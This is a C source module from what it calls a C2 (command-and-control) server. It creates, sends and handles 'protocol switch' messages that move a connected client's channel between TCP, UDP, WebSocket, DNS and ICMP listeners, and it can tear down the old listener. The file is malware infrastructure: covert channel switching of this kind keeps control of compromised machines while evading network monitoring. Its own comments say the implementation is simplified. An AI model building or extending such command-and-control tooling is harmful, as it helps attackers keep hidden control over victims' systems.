/**
 * @file protocol_switch.c
 * @brief Protocol switching implementation for C2 server
 */

#include "protocol_switch.h"
#include "../common/logger.h"
#include "../common/utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/**
 * @brief Create a protocol switch message
 */
status_t protocol_switch_create_message(protocol_type_t protocol, uint16_t port, const char* domain, 
                                      uint32_t timeout_ms, uint8_t flags, protocol_switch_message_t* message) {
    if (message == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Initialize message
    memset(message, 0, sizeof(protocol_switch_message_t));
    
    // Set fields
    message->magic = PROTOCOL_SWITCH_MAGIC;
    message->protocol = protocol;
    message->port = port;
    message->timeout_ms = timeout_ms;
    message->flags = flags;
    
    // Set domain if provided
    if (domain != NULL) {
        strncpy(message->domain, domain, sizeof(message->domain) - 1);
        message->domain[sizeof(message->domain) - 1] = '\0';
    }
    
    return STATUS_SUCCESS;
}

/**
 * @brief Send a protocol switch message to a client
 */
status_t protocol_switch_send_message(client_t* client, const protocol_switch_message_t* message) {
    if (client == NULL || message == NULL) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Create protocol message
    protocol_message_t protocol_message;
    protocol_message.data = (uint8_t*)message;
    protocol_message.data_len = sizeof(protocol_switch_message_t);
    
    // Send message
    status_t status = protocol_manager_send_message(client->listener, client, &protocol_message);
    
    if (status != STATUS_SUCCESS) {
        LOG_ERROR("Failed to send protocol switch message to client %s: %d", client->id, status);
        return status;
    }
    
    LOG_INFO("Sent protocol switch message to client %s: protocol=%d, port=%d, flags=0x%02x",
             client->id, message->protocol, message->port, message->flags);
    
    return STATUS_SUCCESS;
}

/**
 * @brief Process a protocol switch message
 */
status_t protocol_switch_process_message(client_t* client, const uint8_t* data, size_t data_len) {
    if (client == NULL || data == NULL || data_len < sizeof(protocol_switch_message_t)) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Check if this is a protocol switch message
    if (!protocol_switch_is_message(data, data_len)) {
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Cast data to protocol switch message
    const protocol_switch_message_t* message = (const protocol_switch_message_t*)data;
    
    // Log message
    LOG_INFO("Received protocol switch message from client %s: protocol=%d, port=%d, flags=0x%02x",
             client->id, message->protocol, message->port, message->flags);
    
    // Check if protocol is valid
    if (message->protocol < PROTOCOL_TYPE_TCP || message->protocol > PROTOCOL_TYPE_DNS) {
        LOG_ERROR("Invalid protocol type in switch message: %d", message->protocol);
        return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Create protocol listener configuration
    protocol_listener_config_t config;
    memset(&config, 0, sizeof(config));
    
    // Set configuration based on protocol
    switch (message->protocol) {
        case PROTOCOL_TYPE_TCP:
        case PROTOCOL_TYPE_UDP:
        case PROTOCOL_TYPE_WS:
            config.bind_address = NULL;  // Use default bind address
            config.port = message->port;
            config.timeout_ms = message->timeout_ms;
            
            if (message->protocol == PROTOCOL_TYPE_WS) {
                config.ws_path = "/";  // Use default WebSocket path
            }
            break;
            
        case PROTOCOL_TYPE_DNS:
            config.bind_address = NULL;  // Use default bind address
            config.port = message->port;
            config.timeout_ms = message->timeout_ms;
            config.domain = message->domain;
            break;
            
        case PROTOCOL_TYPE_ICMP:
            config.bind_address = NULL;  // Use default bind address
            config.timeout_ms = message->timeout_ms;
            config.pcap_device = "any";  // Use default PCAP device
            break;
            
        default:
            LOG_ERROR("Unsupported protocol type in switch message: %d", message->protocol);
            return STATUS_ERROR_INVALID_PARAM;
    }
    
    // Create new protocol listener
    protocol_listener_t* new_listener = NULL;
    status_t status = protocol_manager_create_listener(message->protocol, &config, &new_listener);
    
    if (status != STATUS_SUCCESS) {
        LOG_ERROR("Failed to create new protocol listener: %d", status);
        return status;
    }
    
    // Register callbacks
    status = protocol_manager_register_callbacks(new_listener,
                                               client->listener->on_message_received,
                                               client->listener->on_client_connected,
                                               client->listener->on_client_disconnected);
    
    if (status != STATUS_SUCCESS) {
        LOG_ERROR("Failed to register callbacks for new protocol listener: %d", status);
        protocol_manager_destroy_listener(new_listener);
        return status;
    }
    
    // Start new listener
    status = protocol_manager_start_listener(new_listener);
    
    if (status != STATUS_SUCCESS) {
        LOG_ERROR("Failed to start new protocol listener: %d", status);
        protocol_manager_destroy_listener(new_listener);
        return status;
    }
    
    // Update client's listener
    protocol_listener_t* old_listener = client->listener;
    client->listener = new_listener;
    
    // Update client's protocol context
    // Note: This is a simplified implementation. In a real implementation,
    // you would need to create a new protocol context for the new listener.
    client->protocol_context = NULL;
    
    LOG_INFO("Switched client %s protocol from %d to %d",
             client->id, old_listener->protocol_type, new_listener->protocol_type);
    
    // Check if we should stop the old listener
    // Note: In a real implementation, you would need to check if other clients
    // are still using the old listener before stopping it.
    if (message->flags & PROTOCOL_SWITCH_FLAG_IMMEDIATE) {
        protocol_manager_stop_listener(old_listener);
        protocol_manager_destroy_listener(old_listener);
        
        LOG_INFO("Stopped and destroyed old protocol listener");
    }
    
    return STATUS_SUCCESS;
}

/**
 * @brief Check if a message is a protocol switch message
 */
bool protocol_switch_is_message(const uint8_t* data, size_t data_len) {
    if (data == NULL || data_len < sizeof(protocol_switch_message_t)) {
        return false;
    }
    
    // Check magic number
    const protocol_switch_message_t* message = (const protocol_switch_message_t*)data;
    
    return message->magic == PROTOCOL_SWITCH_MAGIC;
}
